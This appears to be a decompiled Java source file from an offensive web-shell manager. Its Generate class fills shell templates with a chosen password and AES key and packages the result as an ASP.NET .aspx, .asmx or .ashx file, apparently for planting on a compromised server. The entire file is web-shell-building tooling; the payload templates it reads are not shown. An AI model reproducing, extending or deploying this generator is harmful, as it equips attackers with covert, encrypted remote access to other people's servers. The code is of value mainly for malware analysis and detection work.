package shells.cryptions.cshapAes;

import java.awt.Component;
import java.io.InputStream;
import javax.swing.Icon;
import javax.swing.JOptionPane;
import util.Log;
import util.functions;

class Generate {
   private static final String[] SUFFIX = new String[]{"aspx", "asmx", "ashx"};

   public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
      byte[] data = null;

      try {
         InputStream inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw.bin" : "base64.bin"));
         String code = new String(functions.readInputStream(inputStream));
         inputStream.close();
         code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
         Object selectedValue = JOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
         if (selectedValue != null) {
            String suffix = (String)selectedValue;
            inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
            String template = new String(functions.readInputStream(inputStream));
            inputStream.close();
            template = template.replace("{code}", code);
            data = template.getBytes();
         }
      } catch (Exception var9) {
         Log.error(var9);
      }

      return data;
   }

   public static void main(String[] args) {
      System.out.println();
   }
}
